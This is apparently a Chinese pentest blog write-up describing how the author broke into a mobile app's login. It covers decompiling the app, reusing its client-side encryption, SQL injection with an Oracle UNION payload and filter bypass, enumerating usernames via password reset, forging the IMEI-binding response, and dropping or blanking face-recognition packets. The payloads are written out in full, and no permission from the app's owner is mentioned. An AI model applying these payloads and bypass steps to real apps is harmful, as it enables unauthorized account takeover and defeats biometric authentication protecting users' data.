# App渗透 - 人脸识别登录绕过

打开APP是一个登录框

![](../Images/d14b03597df1685663830c8f7420af6b.png)

  

抓包后发现参数被加密了

![](../Images/40c0363fb876070154e3a61bf1f40dd1.png)

  

使用`Jadx`脱源码发现，并没有加壳也没有混淆，运气很好

![](../Images/81d6ee45775e1f6b7d35ea93306f1d75.png)

  

根据经验，先搜索`Encrypt、Decrypt`等关键字，发现在Common.js中有一个`encryptData`函数

![](../Images/e7a7ecc235901d278fc57909e4dd1b7e.png)

  

定位过去，一套加解密算法都写好了放在这

![](../Images/3620af48d1f0317ac17a0db90ecb0801.png)

  

放到浏览器console里面调试，果然没错

![](../Images/068ba071da864f9dbb06d86c3b9f8e52.png)

  

首先测试了一下注入

```
`  明文：{"userName":"TEST'","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}`
```

![](../Images/9243292bb86ae2e0e67b03ab8698bf12.png)

  

```
`  明文：{"userName":"TEST''","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}`
```

![](../Images/ead441b175938361ea384e68d1d8a26b.png)

  

```
`  明文：{"userName":"TEST'or'1'='1","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}`
```

![](../Images/112bef0545553453607bab0c2fc5e00c.png)

  

至此已经可以判断该登录点就是一个注入了，可是返回结果始终都是“用户名或密码错”即使用了`' or '1'='1`

![](../Images/7ca1fc8f16613ea856b95f923d45df9c.png)

  

根据返回结果推测，后端的登录处的逻辑代码可能是这样的

  

```
`  userInfo = 'select * from userinfo where username = <userName>';`
```

通过Union注入构造万能密码，是可以造成任意用户登陆的，测试过程如下  
先使用`order by`测试，得知字段的数量为9个，构造`payload`

```
`  # 由于目标服务器带有过滤，所以这里简单的bypass一下`
```

![](../Images/e82ed9571d96260786a7d473f8b86fc8.png)

  

由于`Oracle`在进行`union`查询时，所对应的字段数据类型也必须相同，所以还要进行字段数据类型的测试，最终结果如下

  

```
`  # 注意这里passWord我修改成了123，用来测试Union构造的万能密码是否可行`
```

![](../Images/8950205f493e0caec231ad31c0a51070.png)

  

![](../Images/3dc4dc3dd7013a744eb08d259a5b8a24.png)

  

接下来就是一个字段一个字段的改过去，判断哪个字段对应的是密码字段，测试结果如下

  

```
`  # 注意这里passWord我修改成了Ceshi123@@@，不再是弱口令了`
```

![](../Images/41c8b4faedc1be9ed9bb5e0777085491.png)

  

![](../Images/3ab1f6627963fbce3c58ae1b9a743f95.png)

  

在绕过后，发现程序出现了异常

![](../Images/d681364c436a816252aa9dd38253a8be.png)

  

仔细观察返回的数据，其中有username（用户名）、staffId（职工号）、email（邮箱）、staffName（姓名）、tel（手机号）、mobile（手机号），然而这些数据都是我刚刚自己随便构造的，这里应该需要一个真实的用户信息，供后续的登录流程使用

  

![](../Images/3ab1f6627963fbce3c58ae1b9a743f95.png)

  

好在，还是有一个地方能获取真实的用户信息的  
App还有一个忘记密码的功能（通常这里可以爆破用户名）

  

![](../Images/8dbc259f78ed2e8531f5d7a9dbeedca8.png)

  

利用忘记密码的功能可以判断用户名是否存在，这里随便跑了一下字典，就出来好多用户名

  

![](../Images/ea5a0d64bef2050968fc3f6f5eae1000.png)

  

![](../Images/aa06273e019adab1f117c6266d04d29a.png)

  

自然而然地利用这些用户名使用短信验证码登录

![](../Images/386fe975381655e1453abb4e1506d191.png)

  

获取验证码，然后解密数据包，惊奇的发现返回了用户基本信息

  

![](../Images/fc497c657d29a32830d90ac806c41f83.png)

  

根据登录返回结果，重新测试`payload`，最终结果如下

  

```
`  明文：{"userName":"TEST\'union/**/select/**/<staffId>,\'Qwe123@@@\',\'<userName>\',\'Qwe123@@@\',\'<mobile>\',\'<mobile>\',\'<email>\',\'865166023309431\',<staffId> from dual -- ","passWord":"Qwe123@@@","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}`
```

![](../Images/ac430cd98bcdf85134da3d329e1e40b7.png)

  

仔细看返回的登录数据，已经正常了

![](../Images/3dcd422e9436c291cc832ddafae76f8f.png)

  

然后重新替换数据包登录，提示绑定IMEI

![](../Images/e322771e88abe1bfc2b989f750486042.png)

  

这个绕过很简单，随便输入验证码，替换返回包，把resultCode从1001改为1000就行（常规操作）

  

![](../Images/17a6f8eccf92967d79c51c02a25cf452.png)

  

![](../Images/a7654916a011abeb240339d694f7a2a8.png)

  

最终还要个人脸认证

  

![](../Images/2468778a4f3ff96fa423ae866502ea16.png)

  

先用自己的脸检测，这时候手机会向服务器发包，burp把手机发向服务器的包直接丢掉就可以绕过

  

![](../Images/24fd7000613553b9c42f11358c51c08d.png)

  

点击确定后，还有一个大数据包发向服务器，这里面包含的是人脸数据

![](../Images/580aadb4883d6c69a11024715f1942cc.png)

  

修改数据包，将其中的人脸数据替换为空，然后发送

![](../Images/a315ea49bb7805232dbb390cc207b19c.png)

  

![](../Images/5b3ea576b83f534a11733b96afac9c2b.png)

  

最终的最终，成功登录APP

![](../Images/a9b9a0b0b69f5731fca1b71e64e04c2a.png)

  

![](../Images/f21279d89fc1c395c1eb9685d3fe4110.png)
